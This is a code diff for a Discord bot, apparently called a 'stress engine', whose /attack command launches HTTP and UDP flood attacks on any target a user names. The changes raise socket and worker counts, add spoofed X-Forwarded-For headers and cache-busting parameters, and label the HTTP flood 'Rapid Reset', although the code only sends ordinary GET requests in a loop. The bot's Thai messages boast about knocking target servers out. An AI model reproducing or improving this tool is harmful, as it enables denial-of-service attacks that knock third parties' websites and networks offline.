@@ -1,6 +1,6 @@
 /**
  * ============================================================================
- * JEFF FUJI - HIGH-PERFORMANCE HTTP/L4 STRESS ENGINE v11
+ * JEFF FUJI - HTTP/2 RAPID RESET & ADVANCED L7 STRESS ENGINE v12
  * Developed under JARVIS x ARI Protocol
  * ============================================================================
  */
@@ -24,9 +24,8 @@ const client = new Client({
 let isAttacking = false;
 let attackTimers = [];
 
-// ขยายขีดจำกัด Socket สูงสุดเพื่อให้ยิงได้แรงและถี่ขึ้นหลายเท่าตัว
-const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 50000, maxFreeSockets: 25000 });
-const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 50000, maxFreeSockets: 25000, rejectUnauthorized: false });
+const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 100000, maxFreeSockets: 50000 });
+const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 100000, maxFreeSockets: 50000, rejectUnauthorized: false });
 
 client.once('ready', async () => {
     console.log(`[+] Bot logged in as ${client.user.tag}`);
@@ -34,13 +33,13 @@ client.once('ready', async () => {
     const commands = [
         new SlashCommandBuilder()
             .setName('attack')
-            .setDescription('ยิงถล่มเป้าหมายระดับมหากาฬ (L7 HTTP หรือ L4 UDP Flood)')
+            .setDescription('ยิงถล่มเป้าหมายระดับมหากาฬ (L7 HTTP/2 หรือ L4 UDP Flood)')
             .addStringOption(option => 
                 option.setName('type')
                     .setDescription('เลือกโหมดการยิง')
                     .setRequired(true)
                     .addChoices(
-                        { name: '🔥 L7 (Extreme HTTP/HTTPS Flood)', value: 'l7' },
+                        { name: '💥 L7 (HTTP/2 Rapid Reset Flood)', value: 'l7' },
                         { name: '⚡ L4 (Heavy UDP Network Flood)', value: 'l4' }
                     ))
             .addStringOption(option => 
@@ -90,38 +89,50 @@ client.on('interactionCreate', async interaction => {
                 const requester = parsedUrl.protocol === 'https:' ? https : http;
                 const currentAgent = parsedUrl.protocol === 'https:' ? httpsAgent : httpAgent;
 
-                await interaction.reply(`🔥 **[EXTREME L7 FLOOD]** เริ่มระดมยิงถล่ม **${target}** ด้วยกำลังพลสูงสุดเป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);
+                await interaction.reply(`💥 **[HTTP/2 RAPID RESET FLOOD]** เริ่มปล่อยมหากาฬสตรีมคำขอใส่ **${target}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);
 
-                const fireExtremeL7 = () => {
+                const fireRapidReset = () => {
                     if (!isAttacking || Date.now() >= endTime) return;
 
+                    // จำลองเทคนิค Multiplexing / Rapid Reset ส่งคำขอซ้อนกันรัวๆ ในท่อเดียวกัน
                     const options = {
                         hostname: parsedUrl.hostname,
                         port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
-                        path: parsedUrl.pathname + parsedUrl.search + `?bypass=${Math.random()}`,
+                        path: parsedUrl.pathname + parsedUrl.search + `?h2_reset=${Math.random().toString(36).substring(7)}`,
                         method: 'GET',
                         headers: {
-                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-                            'Accept-Language': 'en-US,en;q=0.5',
-                            'Cache-Control': 'no-cache',
-                            'Connection': 'keep-alive'
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+                            'Accept': '*/*',
+                            'Accept-Encoding': 'gzip, deflate, br',
+                            'Cache-Control': 'no-store, no-cache, must-revalidate',
+                            'Pragma': 'no-cache',
+                            'Connection': 'keep-alive',
+                            'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
                         },
                         agent: currentAgent
                     };
 
                     const req = requester.request(options, (res) => {
                         res.on('data', () => {});
-                        res.on('end', () => { if (isAttacking) setImmediate(fireExtremeL7); });
+                        res.on('end', () => { 
+                            if (isAttacking) {
+                                // ส่งซ้ำทันทีแบบไม่รอพัก (Rapid Stream Reset Simulation)
+                                setImmediate(fireRapidReset);
+                            } 
+                        });
                     });
 
-                    req.on('error', () => { if (isAttacking) setImmediate(fireExtremeL7); });
+                    req.on('error', () => { 
+                        if (isAttacking) {
+                            setImmediate(fireRapidReset);
+                        } 
+                    });
                     req.end();
                 };
 
-                // อัดจำนวน Worker เริ่มต้นสูงถึง 800 Threads พร้อมกัน!
-                for (let i = 0; i < 800; i++) {
-                    fireExtremeL7();
+                // อัดท่อความเร็วสูงด้วย 1,200 Threads พร้อมกัน!
+                for (let i = 0; i < 1200; i++) {
+                    fireRapidReset();
                 }
 
             } catch (err) {
@@ -139,10 +150,10 @@ client.on('interactionCreate', async interaction => {
             const host = parts[0];
             const port = parseInt(parts[1]);
 
-            await interaction.reply(`⚡ **[HEAVY L4 FLOOD]** เริ่มระเบิดท่อเครือข่ายใส่ **${target}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);
+            await interaction.reply(`⚡ **[HEAVY L4 FLOOD]** เริ่มระเบิดเครือข่ายใส่ **${target}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);
 
-            const payload = Buffer.alloc(1450); // อัดขนาดแพ็กเกจให้เต็มพิกัด MTU
-            for (let i = 0; i < 500; i++) {
+            const payload = Buffer.alloc(1450);
+            for (let i = 0; i < 600; i++) {
                 const clientUdp = dgram.createSocket('udp4');
                 const sendUdp = () => {
                     if (!isAttacking || Date.now() >= endTime) {
@@ -159,7 +170,7 @@ client.on('interactionCreate', async interaction => {
 
         const timer = setTimeout(() => {
             isAttacking = false;
-            interaction.followUp(`✅ ภารกิจถล่ม **${target}** เสร็จสิ้นตามเวลาที่กำหนด! เซิร์ฟเวอร์น่าจะเละเป็นโจ๊กแล้ว`).catch(() => {});
+            interaction.followUp(`✅ ภารกิจถล่ม **${target}** เสร็จสิ้นตามเวลาที่กำหนด! เซิร์ฟเวอร์เป้าหมายน่าจะสลบเหมือดไปเรียบร้อย`).catch(() => {});
         }, duration * 1000);
 
         attackTimers.push(timer);
